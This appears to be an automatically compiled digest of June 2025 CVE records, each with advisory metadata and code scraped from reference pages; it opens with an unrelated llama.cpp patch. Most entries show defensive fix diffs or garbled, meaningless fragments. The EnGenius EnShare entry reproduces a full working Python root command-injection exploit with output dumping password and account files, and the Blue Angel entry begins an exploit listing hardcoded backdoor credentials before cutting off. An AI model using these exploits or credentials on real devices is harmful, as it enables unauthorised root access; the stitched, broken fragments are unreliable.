--- a/src/llama-vocab.cpp
+++ b/src/llama-vocab.cpp
@@ -3074,6 +3074,11 @@ int32_t llama_vocab::tokenize(
                         bool   add_special,
                         bool   parse_special) const {
     auto res = tokenize(std::string(text, text_len), add_special, parse_special);
+    if (res.size() >= static_cast<size_t>(std::numeric_limits<int32_t>::max())) {
+        LLAMA_LOG_ERROR("%s: tokenization result size %zu exceeds int32_t limit\n", __func__, res.size());
+        return std::numeric_limits<int32_t>::min();
+    }
+    
     if (n_tokens_max < (int) res.size()) {
         // LLAMA_LOG_ERROR("%s: too many tokens\n", __func__);
         return -((int) res.size());


================================================================================


CVE ID: CVE-2025-47943
Published: 2025-06-24T04:15:46.743
Modified: 2025-07-30T18:15:40.640
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Gogs is an open source self-hosted Git service. In application version 0.14.0+dev and prior, there is a stored cross-site scripting (XSS) vulnerability present in Gogs, which allows client-side Javascript code execution. The vulnerability is caused by the usage of a vulnerable and outdated component: pdfjs-1.4.20 under public/plugins/. This issue has been fixed for gogs.io/gogs in version 0.13.3.

References (5):
  1. https://github.com/gogs/gogs/commit/110117b2e5e5baa4809c819bec701e929d2d8d40
  2. https://github.com/gogs/gogs/releases/tag/v0.13.3
  3. https://github.com/gogs/gogs/security/advisories/GHSA-xh32-cx6c-cp4v
  4. https://www.hacktivesecurity.com/blog/2025/07/15/cve-2025-47943-stored-xss-in-gogs-via-pdf
  5. https://github.com/gogs/gogs/security/advisories/GHSA-xh32-cx6c-cp4v

Attempting to extract code examples from references...

--- Code from https://github.com/gogs/gogs/releases/tag/v0.13.3 ---
pam

[email]

[email] PASSWORD

================================================================================


CVE ID: CVE-2024-56731
Published: 2025-06-24T04:15:45.813
Modified: 2025-08-21T20:43:18.773
CVSS Score: 10.0 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-552: CWE-552

Description:
Gogs is an open source self-hosted Git service. Prior to version 0.13.3, it's still possible to delete files under the .git directory and achieve remote command execution due to an insufficient patch for CVE-2024-39931. Unprivileged user accounts can execute arbitrary commands on the Gogs instance with the privileges of the account specified by RUN_USER in the configuration. Allowing attackers to access and alter any users' code hosted on the same instance. This issue has been patched in version 0.13.3.

References (3):
  1. https://github.com/gogs/gogs/commit/77a4a945ae9a87f77e392e9066b560edb71b5de9 [Patch]
  2. https://github.com/gogs/gogs/releases/tag/v0.13.3 [Release Notes]
  3. https://github.com/gogs/gogs/security/advisories/GHSA-wj44-9vcg-wjq7 [Vendor Advisory, Patch]

Attempting to extract code examples from references...

--- Code from https://github.com/gogs/gogs/commit/77a4a945ae9a87f77e392e9066b560edb71b5de9 ---
From 77a4a945ae9a87f77e392e9066b560edb71b5de9 Mon Sep 17 00:00:00 2001
From: Joe Chen <jc@unknwon.io>
Date: Sun, 22 Dec 2024 15:24:18 -0500
Subject: [PATCH] repo: prevent preview and delete files in `.git` directories
 (#7870)

## Describe the pull request

Fixes
https://github.com/gogs/gogs/security/advisories/GHSA-ccqv-43vm-4f3w
---
 internal/database/repo_editor.go | 10 ++++++++++
 1 file changed, 10 insertions(+)

diff --git a/internal/database/repo_editor.go b/internal/database/repo_editor.go
index c0be2528d10..1ea436f8a32 100644
--- a/internal/database/repo_editor.go
+++ b/internal/database/repo_editor.go
@@ -220,6 +220,11 @@ func (repo *Repository) UpdateRepoFile(doer *User, opts UpdateRepoFileOptions) (
 
 // GetDiffPreview produces and returns diff result of a file which is not yet committed.
 func (repo *Repository) GetDiffPreview(branch, treePath, content string) (diff *gitutil.Diff, err error) {
+	// 🚨 SECURITY: Prevent uploading files into the ".git" directory
+	if isRepositoryGitPath(treePath) {
+		return nil, errors.Errorf("bad tree path %q", treePath)
+	}
+
 	repoWorkingPool.CheckIn(com.ToStr(repo.ID))
 	defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))
 
@@ -283,6 +288,11 @@ type DeleteRepoFileOptions struct {
 }
 
 func (repo *Repository) DeleteRepoFile(doer *User, opts DeleteRepoFileOptions) (err error) {
+	// 🚨 SECURITY: Prevent uploading files into the ".git" directory
+	if isRepositoryGitPath(opts.TreePath) {
+		return errors.Errorf("bad tree path %q", opts.TreePath)
+	}
+
 	repoWorkingPool.CheckIn(com.ToStr(repo.ID))
 	defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))
 


================================================================================


CVE ID: CVE-2025-6552
Published: 2025-06-24T03:15:35.520
Modified: 2025-06-26T18:58:14.280
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

Description:
A vulnerability was found in java-aodeng Hope-Boot 1.0.0. It has been classified as problematic. Affected is the function doLogin of the file /src/main/java/com/hope/controller/WebController.java of the component Login. The manipulation of the argument redirect_url leads to open redirect. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250613-02.md
  2. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250613-02.md#steps-to-reproduce
  3. https://vuldb.com/?ctiid.313692
  4. https://vuldb.com/?id.313692
  5. https://vuldb.com/?submit.596681

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313692 ---
doLogin

doLogin

redirect_url

================================================================================


CVE ID: CVE-2025-52574
Published: 2025-06-24T03:15:34.797
Modified: 2025-06-26T18:58:14.280
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
SysmonElixir is a system monitor HTTP service in Elixir. Prior to version 1.0.1, the /read endpoint reads any file from the server's /etc/passwd by default. In v1.0.1, a whitelist was added that limits reading to only files under priv/data. This issue has been patched in version 1.0.1.

References (2):
  1. https://github.com/bocaletto-luca/elixir-system-monitor/commit/647a5525f6667a28f1133985213dd080ea11bb87
  2. https://github.com/bocaletto-luca/elixir-system-monitor/security/advisories/GHSA-9vj4-rv7q-36qj

Attempting to extract code examples from references...

--- Code from https://github.com/bocaletto-luca/elixir-system-monitor/commit/647a5525f6667a28f1133985213dd080ea11bb87 ---
From deaf66586b3df785103bb109160e40ac89acca49 Mon Sep 17 00:00:00 2001
From: Bocaletto Luca <58043613+bocaletto-luca@users.noreply.github.com>
Date: Fri, 20 Jun 2025 23:20:16 +0200
Subject: [PATCH 1/3] Update app.exs

---
 app.exs | 17 ++++++++++++-----
 1 file changed, 12 insertions(+), 5 deletions(-)

diff --git a/app.exs b/app.exs
index 5935590..ff20cee 100644
--- a/app.exs
+++ b/app.exs
@@ -35,16 +35,23 @@ defmodule Sysmon.Router do
     send_resp(conn, 404, "Not Found")
   end
 
-# –– VULNERABLE READ ENDPOINT ––
+# –– VULNERABLE FIX READ ENDPOINT ––
 get "/read" do
-  # path traversal vulnerability intenzionale
-  path = conn.params["file"] || "/etc/passwd"
-  contents = File.read!(path)
-  send_resp(conn, 200, contents)
+  requested = conn.params["file"] || ""
+  base      = Path.expand("priv/data", File.cwd!())
+  full      = Path.expand(requested, File.cwd!())
+
+  if String.starts_with?(full, base) do
+    contents = File.read!(full)
+    send_resp(conn, 200, contents)
+  else
+    send_resp(conn, 400, "Invalid file path")
+  end
 end
 
 
 
+
   #–– Helpers ––#
 
   defp cpu_usage do

From 12466f3b3650877cd3aa62606600375e7de65a97 Mon Sep 17 00:00:00 2001
From: Bocaletto Luca <58043613+bocaletto-luca@users.noreply.github.com>
Date: Fri, 20 Jun 2025 23:20:33 +0200
Subject: [PATCH 2/3] Update app.exs

---
 app.exs | 3 ---
 1 file changed, 3 deletions(-)

diff --git a/app.exs b/app.exs
index ff20cee..275ee4d 100644
--- a/app.exs
+++ b/app.exs
@@ -49,9 +49,6 @@ get "/read" do
   end
 end
 
-
-
-
   #–– Helpers ––#
 
   defp cpu_usage do

From 6152ee01c36cf5de350253038da485f7eb5f609b Mon Sep 17 00:00:00 2001
From: Bocaletto Luca <58043613+bocaletto-luca@users.noreply.github.com>
Date: Fri, 20 Jun 2025 23:21:33 +0200
Subject: [PATCH 3/3] Commit directly to the v1.0.1 branch
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

🔧 Patch path traversal in /read endpoint (v1.0.1)
---
 app.exs | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/app.exs b/app.exs
index 275ee4d..76df2af 100644
--- a/app.exs
+++ b/app.exs
@@ -35,7 +35,7 @@ defmodule Sysmon.Router do
     send_resp(conn, 404, "Not Found")
   end
 
-# –– VULNERABLE FIX READ ENDPOINT ––
+# –– Patch VULNERABLE FIX READ ENDPOINT ––
 get "/read" do
   requested = conn.params["file"] || ""
   base      = Path.expand("priv/data", File.cwd!())


================================================================================


CVE ID: CVE-2025-52560
Published: 2025-06-24T03:15:34.653
Modified: 2025-06-26T18:58:14.280
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

CWE Categories:
  - CWE-640: CWE-640

Description:
Kanboard is project management software that focuses on the Kanban methodology. Prior to version 1.2.46, Kanboard allows password reset emails to be sent with URLs derived from the unvalidated Host header when the application_url configuration is unset (default behavior). This allows an attacker to craft a malicious password reset link that leaks the token to an attacker-controlled domain. If a victim (including an administrator) clicks the poisoned link, their account can be taken over. This affects all users who initiate a password reset while application_url is not set. This issue has been patched in version 1.2.46.

References (2):
  1. https://github.com/kanboard/kanboard/commit/bca2bd7ab95e7990e358fd35a7daf51a9c16aa75
  2. https://github.com/kanboard/kanboard/security/advisories/GHSA-2ch5-gqjm-8p92

Attempting to extract code examples from references...

--- Code from https://github.com/kanboard/kanboard/commit/bca2bd7ab95e7990e358fd35a7daf51a9c16aa75 ---
From bca2bd7ab95e7990e358fd35a7daf51a9c16aa75 Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?Fr=C3=A9d=C3=A9ric=20Guillot?= <fred@kanboard.net>
Date: Fri, 20 Jun 2025 14:54:02 -0700
Subject: [PATCH] fix(security): prevent potential `Host` header injection via
 `SERVER_NAME`

PHP's `SERVER_NAME` is commonly derived from the `Host` header, which can be manipulated by clients and lead to header injection vulnerabilities.

This change removes all usage of `SERVER_NAME` for generating absolute URLs and falls back to `http://localhost/` when the application URL is not explicitly configured.
---
 app/Helper/UrlHelper.php             | 22 +----------------
 tests/units/Helper/UrlHelperTest.php | 35 +---------------------------
 2 files changed, 2 insertions(+), 55 deletions(-)

diff --git a/app/Helper/UrlHelper.php b/app/Helper/UrlHelper.php
index 29637ebcf2..08bd2b972a 100644
--- a/app/Helper/UrlHelper.php
+++ b/app/Helper/UrlHelper.php
@@ -148,7 +148,7 @@ public function to($controller, $action, array $params = array(), $anchor = '',
     public function base()
     {
         if (empty($this->base)) {
-            $this->base = $this->configModel->get('application_url') ?: $this->server();
+            $this->base = $this->configModel->get('application_url') ?: 'http://localhost/';
         }
 
         return $this->base;
@@ -175,26 +175,6 @@ public function dir()
         return $this->directory;
     }
 
-    /**
-     * Get current server base url
-     *
-     * @access public
-     * @return string
-     */
-    public function server()
-    {
-        if ($this->request->getServerVariable('SERVER_NAME') === '') {
-            return 'http://localhost/';
-        }
-
-        $url = $this->request->isHTTPS() ? 'https://' : 'http://';
-        $url .= $this->request->getServerVariable('SERVER_NAME');
-        $url .= $this->request->getServerVariable('SERVER_PORT') == 80 || $this->request->getServerVariable('SERVER_PORT') == 443 ? '' : ':'.$this->request->getServerVariable('SERVER_PORT');
-        $url .= $this->dir() ?: '/';
-
-        return $url;
-    }
-
     /**
      * Build relative url
      *
diff --git a/tests/units/Helper/UrlHelperTest.php b/tests/units/Helper/UrlHelperTest.php
index b1f0a03283..1950a833e2 100644
--- a/tests/units/Helper/UrlHelperTest.php
+++ b/tests/units/Helper/UrlHelperTest.php
@@ -77,43 +77,10 @@ public function testDir()
         $this->assertEquals('/', $h->dir());
     }
 
-    public function testServer()
-    {
-        $this->container['request'] = new Request($this->container, array(
-                'PHP_SELF' => '/index.php',
-                'REQUEST_METHOD' => 'GET',
-                'SERVER_NAME' => 'localhost',
-                'SERVER_PORT' => 80,
-            )
-        );
-
-        $h = new UrlHelper($this->container);
-        $this->assertEquals('http://localhost/', $h->server());
-
-        $this->container['request'] = new Request($this->container, array(
-                'PHP_SELF' => '/index.php',
-                'REQUEST_METHOD' => 'GET',
-                'SERVER_NAME' => 'kb',
-                'SERVER_PORT' => 1234,
-            )
-        );
-
-        $h = new UrlHelper($this->container);
-        $this->assertEquals('http://kb:1234/', $h->server());
-    }
-
     public function testBase()
     {
-        $this->container['request'] = new Request($this->container, array(
-                'PHP_SELF' => '/index.php',
-                'REQUEST_METHOD' => 'GET',
-                'SERVER_NAME' => 'kb',
-                'SERVER_PORT' => 1234,
-            )
-        );
-
         $h = new UrlHelper($this->container);
-        $this->assertEquals('http://kb:1234/', $h->base());
+        $this->assertEquals('http://localhost/', $h->base());
 
         $c = new ConfigModel($this->container);
         $c->save(array('application_url' => 'https://mykanboard/'));


================================================================================


CVE ID: CVE-2025-48469
Published: 2025-06-24T03:15:34.390
Modified: 2025-07-09T15:21:28.920
CVSS Score: 9.6 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-306: Missing Authentication for Critical Function

Description:
Successful exploitation of the vulnerability could allow an unauthenticated attacker to upload firmware through a public update page, potentially leading to backdoor installation or privilege escalation.

References (2):
  1. https://jro.sg/CVEs/CVE-2025-48469/ [Exploit, Third Party Advisory]
  2. https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2025-061/ [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://jro.sg/CVEs/CVE-2025-48469/ ---
A119B01

GET /__dnldpage

POST /file_xfer

================================================================================


CVE ID: CVE-2025-6551
Published: 2025-06-24T02:15:23.170
Modified: 2025-07-08T14:26:00.507
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability was found in java-aodeng Hope-Boot 1.0.0 and classified as problematic. This issue affects the function Login of the file /src/main/java/com/hope/controller/WebController.java. The manipulation of the argument errorMsg leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250613-01/report.md [Exploit, Third Party Advisory]
  2. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250613-01/report.md#steps-to-reproduce [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313691 [Permissions Required, Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?id.313691 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.596615 [Third Party Advisory, VDB Entry]
  6. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250613-01/report.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313691 ---
Login

login

errorMsg

================================================================================


CVE ID: CVE-2025-6536
Published: 2025-06-24T02:15:22.967
Modified: 2025-06-26T18:58:14.280
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-617: CWE-617

Description:
A vulnerability has been found in Tarantool up to 3.3.1 and classified as problematic. Affected by this vulnerability is the function tm_to_datetime in the library src/lib/core/datetime.c. The manipulation leads to reachable assertion. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/tarantool/tarantool/issues/11347
  2. https://github.com/user-attachments/files/19613858/tarantool_crash.txt
  3. https://vuldb.com/?ctiid.313663
  4. https://vuldb.com/?id.313663
  5. https://vuldb.com/?submit.597454

Attempting to extract code examples from references...

--- Code from https://github.com/tarantool/tarantool/issues/11347 ---
mday &gt;= 1 &amp;&amp; mday &lt;= 31

tm_to_datetime

src/lib/core/datetime.c:150

================================================================================


CVE ID: CVE-2025-6535
Published: 2025-06-24T01:15:25.513
Modified: 2025-07-09T19:08:02.033
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in xxyopen/201206030 novel-plus up to 5.1.3 and classified as critical. This vulnerability affects the function list of the file novel-admin/src/main/resources/mybatis/system/UserMapper.xml of the component User Management Module. The manipulation of the argument sort/order leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://blog.0xd00.com/blog/sqli-in-user-list-leads-to-sensitive-data-disclosure [Exploit, Third Party Advisory]
  2. https://blog.0xd00.com/blog/sqli-in-user-list-leads-to-sensitive-data-disclosure#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313654 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313654 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.596573 [Third Party Advisory, VDB Entry]
  6. https://blog.0xd00.com/blog/sqli-in-user-list-leads-to-sensitive-data-disclosure [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://blog.0xd00.com/blog/sqli-in-user-list-leads-to-sensitive-data-disclosure ---
/list

${...}

sort

================================================================================


CVE ID: CVE-2025-6534
Published: 2025-06-24T01:15:25.303
Modified: 2025-07-09T19:08:31.183
CVSS Score: 4.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-99: CWE-99
  - CWE-639: CWE-639

Description:
A vulnerability, which was classified as problematic, was found in xxyopen/201206030 novel-plus up to 5.1.3. This affects the function remove of the file novel-admin/src/main/java/com/java2nb/common/controller/FileController.java of the component File Handler. The manipulation leads to improper control of resource identifiers. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://blog.0xd00.com/blog/missing-authorization-leads-to-arbitrary-file-deletion [Exploit, Third Party Advisory]
  2. https://blog.0xd00.com/blog/missing-authorization-leads-to-arbitrary-file-deletion#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313653 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313653 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.596505 [Third Party Advisory, VDB Entry]
  6. https://blog.0xd00.com/blog/missing-authorization-leads-to-arbitrary-file-deletion [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://blog.0xd00.com/blog/missing-authorization-leads-to-arbitrary-file-deletion ---
remove

FileController.java

id

================================================================================


CVE ID: CVE-2025-34036
Published: 2025-06-24T01:15:24.903
Modified: 2025-07-09T19:08:40.117
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
An OS command injection vulnerability exists in white-labeled DVRs manufactured by TVT, affecting a custom HTTP service called "Cross Web Server" that listens on TCP ports 81 and 82. The web interface fails to sanitize input in the URI path passed to the language extraction functionality. When the server processes a request to /language/[lang]/index.html, it uses the [lang] input unsafely in a tar extraction command without proper escaping. This allows an unauthenticated remote attacker to inject shell commands and achieve arbitrary command execution as root.

References (4):
  1. https://vulncheck.com/advisories/shenzhen-tvt-cctv-dvr-command-injection [Third Party Advisory]
  2. https://web.archive.org/web/20160322204109/http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/exploits/39596 [Exploit, Third Party Advisory]
  4. https://web.archive.org/web/20160322204109/http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://web.archive.org/web/20160322204109/http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html ---
/language/[language]/index.html



================================================================================


CVE ID: CVE-2025-34035
Published: 2025-06-24T01:15:24.763
Modified: 2025-07-09T19:08:56.867
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
An OS command injection vulnerability exists in EnGenius EnShare Cloud Service version 1.4.11 and earlier. The usbinteract.cgi script fails to properly sanitize user input passed to the path parameter, allowing unauthenticated remote attackers to inject arbitrary shell commands. The injected commands are executed with root privileges, leading to full system compromise.

References (6):
  1. https://cxsecurity.com/issue/WLB-2017060050 [Exploit, Third Party Advisory]
  2. https://packetstormsecurity.com/files/142792 [Broken Link]
  3. https://vulncheck.com/advisories/engenius-enshare-iot-gigabit-cloud-service [Third Party Advisory]
  4. https://www.exploit-db.com/exploits/42114 [Exploit, Third Party Advisory]
  5. https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php [Exploit, Third Party Advisory]
  6. https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/42114 ---
<code class="language-py" style="white-space: pre-wrap;">#!/usr/bin/env python
# coding: utf8
#
#
# EnGenius EnShare IoT Gigabit Cloud Service 1.4.11 Root Remote Code Execution
#
#
# Vendor: EnGenius Technologies Inc.
# Product web page: https://www.engeniustech.com
# Affected version: ESR300  (1.4.9, 1.4.7, 1.4.2, 1.4.1.28, 1.4.0, 1.3.1.42, 1.1.0.28)
#                   ESR350  (1.4.11, 1.4.9, 1.4.5, 1.4.2, 1.4.0, 1.3.1.41, 1.1.0.29)
#                   ESR600  (1.4.11, 1.4.9, 1.4.5, 1.4.3, 1.4.2, 1.4.1, 1.4.0.23, 1.3.1.63, 1.2.1.46, 1.1.0.50)
#                   EPG5000 (1.3.9.21, 1.3.7.20, 1.3.3.17, 1.3.3, 1.3.2, 1.3.0, 1.2.0)
#                   ESR900  (1.4.5, 1.4.3, 1.4.0, 1.3.5.18 build-12032015@liwei (5668b74), 1.3.1.26, 1.3.0, 1.2.2.23, 1.1.0)
#                   ESR1200 (1.4.5, 1.4.3, 1.4.1, 1.3.1.34, 1.1.0)
#                   ESR1750 (1.4.5, 1.4.3, 1.4.1, 1.4.0, 1.3.1.34, 1.3.0, 1.2.2.27, 1.1.0)
#
# Summary: With the EnGenius IoT Gigabit Routers and free EnShare app, use
# your iPhone, iPad or Android-based tablet or smartphone to transfer
# video, music and other files to and from a router-attached USB hard
# drive. Enshare is a USB media storage sharing application that enables
# access to files remotely. The EnShare feature allows you to access media
# content stored on a USB hard drive connected to the router&#039;s USB port in
# the home and when you are away from home when you have access to the Internet.
# By default the EnShare feature is enabled.
#
# EnShareTM supports both FAT32 and NTFS USB formats. Transfer speeds of data
# from your router-attached USB storage device to a remote/mobile device may
# vary based on Internet uplink and downlink speeds. The router&#039;s design enables
# users to connect numerous wired and wireless devices to it and supports intensive
# applications like streaming HD video and sharing of media in the home and accessing
# media away from the home with EnShare - Your Personal Media Cloud.
#
# Desc: EnGenius EnShare suffers from an unauthenticated command injection
# vulnerability. An attacker can inject and execute arbitrary code as the
# root user via the &#039;path&#039; GET/POST parameter parsed by &#039;usbinteract.cgi&#039;
# script.
#
# =======================================================================
#
# bash-4.4$ python enshare.py 10.0.0.17
# [+] Command: ls -alsh
#   44 -rwxr-xr-x    1 0        0           42.5K Oct 31  2014 getsize.cgi
#    4 -rwxr-xr-x    1 0        0             606 Oct 31  2014 languageinfo.cgi
#   48 -rwxr-xr-x    1 0        0           44.2K Oct 31  2014 upload.cgi
#   48 -rwxr-xr-x    1 0        0           44.5K Oct 31  2014 usbinfo.cgi
#   56 -rwxr-xr-x    1 0        0           54.1K Oct 31  2014 usbinteract.cgi
#    0 drwxr-xr-x    4 0        0               0 Jun  3 00:52 ..
#    0 drwxr-xr-x    2 0        0               0 Oct 31  2014 .
#
# [+] Command: id
# uid=0(root) gid=0(root)
#
# [+] Command: cat /etc/passwd
#
# Connecting to 10.0.0.17 port 9000
#
# HTTP/1.1 200 OK
# root: !:0:0:root:/root:/bin/sh
# administrator: *:65534:65534:administrator:/var:/bin/false
# admin: *:60000:60000:webaccount:/home:/usr/bin/sh
# guest: *:60001:60000:webaccount:/home:/usr/bin/sh
# Content-type: text/html
# Transfer-Encoding: chunked
# Date: Sat, 03 Jun 2017 13:48:14 GMT
# Server: lighttpd/1.4.31
#
# 0
# [+] Command: pwd
# /www/web/cgi-bin
# [+] Command: cat /etc/account.conf
#
# HTTP/1.1 200 OK
# 1: admin:admin:4
# 1: guest:guest:1
# Content-type: text/html
# Transfer-Encoding: chunked
# Date: Sat, 03 Jun 2017 14:53:42 GMT
# Server: lighttpd/1.4.31
# bash-4.4$ 
#
# =======================================================================
#
# Tested on: Linux 2.6.36 (mips)
#            Embedded HTTP Server ,Firmware Version 5.11
#            lighttpd/1.4.31
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2017-5413
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php
#
#
# 17.05.2017
#


import sys, socket

if len(sys.argv) &lt; 2:
    print &#039;Usage: enshare.py &lt;ip&gt; [port]\n&#039;
    quit()

ip = sys.argv[1]
port = 9000 if len(sys.argv) &lt; 3 else int(sys.argv[2])
cmd = raw_input(&#039;[+] Command: &#039;)

payload  = &#039;POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\n&#039;
payload += &#039;Host: {0}:{1}\r\n&#039;
payload += &#039;Content-Length: {2}\r\n&#039;
payload += &#039;Content-Type: application/x-www-form-urlencoded\r\n\r\n&#039;
payload += &#039;action=7&amp;path=\&quot;|{3}||\&quot;&#039;

msg = payload.format( ip, port, len(cmd)+19, cmd )
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target = (ip, port)
print &gt;&gt;sys.stderr, &#039;\nConnecting to %s port %s\n&#039; % target
s.connect(target)
s.sendall(msg)
response = s.recv(5000)
s.close()

print response.strip()
            

================================================================================


CVE ID: CVE-2025-34034
Published: 2025-06-24T01:15:24.630
Modified: 2025-07-09T19:09:03.653
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-798: Use of Hard-coded Credentials

Description:
A hardcoded credential vulnerability exists in the Blue Angel Software Suite deployed on embedded Linux systems. The application contains multiple known default and hardcoded user accounts that are not disclosed in public documentation. These accounts allow unauthenticated or low-privilege attackers to gain administrative access to the device’s web interface.

References (3):
  1. https://vulncheck.com/advisories/5vtechnologies-blue-angel-hardcoded-credentials [Third Party Advisory]
  2. https://www.exploit-db.com/exploits/46792 [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/exploits/46792 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/46792 ---
<code class="language-py" style="white-space: pre-wrap;"># Exploit Title: Blue Angel Software Suite - Authenticated Command Execution
# Google Dork: N/A
# Date: 02/05/2019
# Exploit Author: Paolo Serracino 
# Vendor Homepage: http://www.5vtechnologies.com
# Software Link: N/A
# Version: All
# Tested on: Embedded Linux OS
# CVE : N/A
# Description: Blue Angel Software Suite, an application that runs on embedded devices for VOIP/SIP services is vulnerable to an authenticated 
# command execution in ping command. All default accounts can be used to login and achieve command execution, including the guest one. 
# Moreover there&#039;s another account, defined in the local file device.dat, that provides an apparently &quot;backdoor&quot; account.
# A list of these accounts is hardcoded in the script.

#/usr/bin/python
import sys
import requests


def check_sw(target,port):

  res = requests.get(target + &#039;:&#039; + port)

  if &#039;/cgi-bin/webctrl.cgi?action=index_page&#039; in res.text:
     return True
  else:
     print &quot;[-] DOES NOT LOOK LIKE THE PAGE WE&#039;RE LOOKING FOR&quot;
     return False

def check_login(target,port,command):

   if not check_sw(target,port):
      sys.exit()

   creds_common = [(&#039;blueangel&#039;,&#039;blueangel&#039;), #the &quot;backdoor&quot; account
                   (&#039;root&#039;,&#039;abnareum10&#039;),
